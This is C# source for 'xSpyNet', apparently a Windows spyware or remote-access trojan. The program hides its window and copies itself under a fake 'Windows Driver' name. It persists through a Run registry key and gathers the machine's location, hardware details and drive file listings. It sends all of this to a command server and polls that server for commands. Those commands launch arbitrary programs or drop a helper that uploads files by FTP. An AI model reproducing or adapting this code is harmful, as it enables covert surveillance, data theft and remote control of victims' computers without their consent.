using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Device.Location;
using System.IO;
using System.Collections.Specialized;
using System.Net;
using System.Web;
using System.Diagnostics;
using Microsoft.Win32;

namespace xSpyNet
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        static readonly string[] SizeSuffixes = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
        public static string SizeSuffix(Int64 value)
        {
            if (value < 0) { return "-" + SizeSuffix(-value); }
            if (value == 0) { return "0.0 bytes"; }

            int mag = (int)Math.Log(value, 1024);
            decimal adjustedSize = (decimal)value / (1L << (mag * 10));

            return string.Format("{0:n1} {1}", adjustedSize, SizeSuffixes[mag]);
        }
        ComputerInfo cpinfo = new ComputerInfo();
        Random rnd = new Random();
        int FTPserverid = -1;
        string user = "willx", mainserver = "http://localhost:8080/Projects/xSpynet/";

        //public static void AddApplicationToStartup()
        //{
        //    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
        //    {
        //        key.SetValue("Windows Driver Updater", "\"" + Application.ExecutablePath + "\"");
        //    }
        //}
        public static void RemoveApplicationFromStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.DeleteValue("Windows Driver Updater", false);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Visible=false;
            if(Application.ExecutablePath.ToLower() != (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverchecker.exe").ToLower()) {
                try {
                    if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver"))
                        Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver");
                    File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverchecker.exe");
                    Thread.Sleep(5000);
                    RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    if (key.GetValue("Windows Driver Updater") == null)
                    {
                        key.SetValue("Windows Driver Updater", "\"" + Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverchecker.exe" + "\"");
                    }
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverchecker.exe");
                    Thread.Sleep(2000);
                    Application.Exit();
                }
                catch {

                }
            }
            //Location
            // Create the watcher.
            Watcher = new GeoCoordinateWatcher();
            // Catch the StatusChanged event.
            Watcher.StatusChanged += Watcher_StatusChanged;
            // Start the watcher.
            Watcher.Start();
            SendDataTimer.Start();
            //File
            ComputerInfo cpinfo = new ComputerInfo();
            this.Text += " - " + Environment.MachineName + " - " + ComputerInfo.getCPUID();
            try { 
                foreach (DriveInfo di in DriveInfo.GetDrives())
                {
                    txtColor.Text += cpinfo.GetDirFileFromDrive(di, 1);
                }
                lblHello.ForeColor = Color.Green;
            }
            catch
            {
                lblHello.ForeColor = Color.Red;
                txtColor.Text += "File non accessed";
            }
        }

        // The coordinate watcher.
        private GeoCoordinateWatcher Watcher = null;
        string strLocationLong = "";
        string strLocationLat = "";
        // The watcher's status has change. See if it is ready.
        private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
        {
            if (e.Status == GeoPositionStatus.Disabled) { 
                strLocationLat=strLocationLong = "disabled";
            }
            if (e.Status == GeoPositionStatus.Ready)
            {
                // Display the latitude and longitude.
                if (Watcher.Position.Location.IsUnknown)
                {
                    strLocationLat = strLocationLong = "Error!";
                }
                else
                {
                    // Set Location
                    strLocationLat = Watcher.Position.Location.Latitude.ToString().Replace(',', '.');
                    strLocationLong = Watcher.Position.Location.Longitude.ToString().Replace(',', '.');
                    lblHello.ForeColor = Color.Yellow;
                }
            }
        }
        void SendData()
        {
            // Send File
            try
            {
                var response = http.Post(mainserver+"sn-asend.php", new NameValueCollection() {
                        { "act", "updatepcinfo"},
                        { "user", user},
                        { "cpuid",ComputerInfo.getCPUID()},
                        { "pcname", Environment.MachineName },
                        { "filelist", txtColor.Text},
                        { "more", "OS: "+cpinfo.GetPcInfo("Caption")+Environment.NewLine+"Manufacturer: "+cpinfo.GetPcInfo("manufacturer")+Environment.NewLine+"Model: "+cpinfo.GetPcInfo("model")},
                        { "token", encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                });
                string result = System.Text.Encoding.UTF8.GetString(response);
                lblHello.Text = result;
                if (result != "INSERT_PCINFO_ERROR") { 
                    LocationTimer.Start();
                    OnlineTimer.Start();
                    QueryTimer.Start();
                    try{
                        if (int.Parse(result) > -1)
                            FTPserverid = int.Parse(result);
                    }
                    catch {

                    }
                }
                lblHello.ForeColor = Color.Blue;
            }
            catch
            {
                lblHello.ForeColor = Color.LightPink;
            }
        }

        private void textBox1_Click(object sender, EventArgs e)
        {
            txtColor.SelectAll();
        }

        private void SendDataTimer_Tick(object sender, EventArgs e)
        {
            lblTime.Text = "1";
            LocationTimer.Interval = 2 * 60 * 1000; // 15p
            OnlineTimer.Interval   = 3 * 60 * 1000; // 1p update online?
            QueryTimer.Interval    = 1 * 30 * 1000; // 3p
            SendDataTimer.Stop();
            SendData();
            SendDataTimer.Interval = 3 * 60 * 1000; // 15p
            SendDataTimer.Start();
            lblTime.Text = "0";
        }

        private void LocationTimer_Tick(object sender, EventArgs e)
        {
            var response = http.Post(mainserver+"sn-asend.php", new NameValueCollection() {
                        { "act", "updatelocation"},
                        { "user", user},
                        { "cpuid",ComputerInfo.getCPUID()},
                        { "latitude", strLocationLat},
                        { "longitude", strLocationLong},
                        { "token", encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                });
            string result = System.Text.Encoding.UTF8.GetString(response);
            lblHello.Text = result;
            if (result != "INSERT_PCINFO_ERROR")
                LocationTimer.Start();
        }

        private void OnlineTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                var response = http.Post(mainserver+"sn-asend.php", new NameValueCollection() {
                        { "act", "updateonline"},
                        { "user", user},
                        { "cpuid",ComputerInfo.getCPUID()},
                        { "token", encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                });
                string result = System.Text.Encoding.UTF8.GetString(response);
                lblHello.Text = result;
            }
            catch
            {
                //lblHello.Text = "Check Err";
            }
        }
        //private bool GrantAccess(string fullPath)
        //{
        //    DirectoryInfo dInfo = new DirectoryInfo(fullPath);
        //    DirectorySecurity dSecurity = dInfo.GetAccessControl();
        //    dSecurity.AddAccessRule(new FileSystemAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), FileSystemRights.FullControl, InheritanceFlags.ObjectInherit | InheritanceFlags.ContainerInherit, PropagationFlags.NoPropagateInherit, AccessControlType.Allow));
        //    dInfo.SetAccessControl(dSecurity);
        //    return true;
        //}
        string Hashx = "tu89geji340t89u2";
        private void QueryTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                var response = http.Post(mainserver+"sn-aget.php", new NameValueCollection() {
                        { "act", "getquery"},
                        { "user", user},
                        { "cpuid",ComputerInfo.getCPUID()},
                        { "token", encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                });
                string result = System.Text.Encoding.UTF8.GetString(response);
                string[] totalquery = result.Split('/'),query;
                string queryid,querycode,querytype;
                for (int i = 0; i < totalquery.Count(); i++)
                {
                    if (totalquery[i].Trim() != "") { 
                        query = totalquery[i].Split('|');
                        queryid = query[0];
                        querycode = HttpUtility.UrlDecode(query[1]);
                        querytype = query[2];
                        if (querytype == "getfile" && FTPserverid > -1)
                        {
                            //txtQuery.Text = queryid + " " + querycode + " " + querytype + " " + FTPserverid;
                            txtQuery.Text = FTPserverid.ToString() + " " + encrypt.Encrypt(user, Hashx) + " " + encrypt.Encrypt(ComputerInfo.getCPUID(), Hashx) + " " + encrypt.Encrypt(querycode, Hashx) + " " + encrypt.Encrypt(mainserver, Hashx) + " " + queryid;
                            // Bung file upload FTP tên: Microsoft Driver Update
                            // mdriverupdater

                            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver"))
                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver");
                            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverupdater.exe"))
                            { 
                                byte[] mdriverupdater = Properties.Resources.MicrosoftDriverUpdater;
                                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverupdater.exe", mdriverupdater);
                            }
                            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverupdater.exe") == true)
                            {
                                Process p = new Process();
                                p.StartInfo.FileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Windows Driver\mdriverupdater.exe";
                                p.StartInfo.Arguments = FTPserverid.ToString() + " " + encrypt.Encrypt(user, Hashx) + " " + encrypt.Encrypt(ComputerInfo.getCPUID(), Hashx) + " " + encrypt.Encrypt(querycode, Hashx) + " " + encrypt.Encrypt(mainserver, Hashx) + " " + queryid;
                                txtQuery.Text=p.StartInfo.Arguments;
                                p.Start();
                                //System.Diagnostics.Process.Start();
                            }
                        }
                        else if (querytype == "runapp")
                        {
                            try { 
                                System.Diagnostics.Process.Start(querycode);
                                response = xSpyNet.http.Post(xSpyNet.encrypt.Decrypt(mainserver, Hashx) + "sn-asend.php", new NameValueCollection() {
                                    { "act", "updatequeryinfo"},
                                    { "user", user},
                                    { "cpuid", ComputerInfo.getCPUID()},
                                    { "queryid", queryid},
                                    { "querytype", querytype},
                                    { "token", xSpyNet.encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                                });
                                result = System.Text.Encoding.UTF8.GetString(response);
                            }
                            catch
                            {
                                response = xSpyNet.http.Post(xSpyNet.encrypt.Decrypt(mainserver, Hashx) + "sn-asend.php", new NameValueCollection() {
                                    { "act", "updateerrorquery"},
                                    { "user", user},
                                    { "cpuid", ComputerInfo.getCPUID()},
                                    { "queryid", queryid},
                                    { "querytype", querytype},
                                    { "token", xSpyNet.encrypt.md5("876d4ce235fe510a3141db3158339c5e"+rnd.Next(10).ToString())}
                                });
                                result = System.Text.Encoding.UTF8.GetString(response);
                            }
                        }
                    }
                }
            }
            catch
            {
                //lblHello.Text = "Err";
            }
        }
    }
}
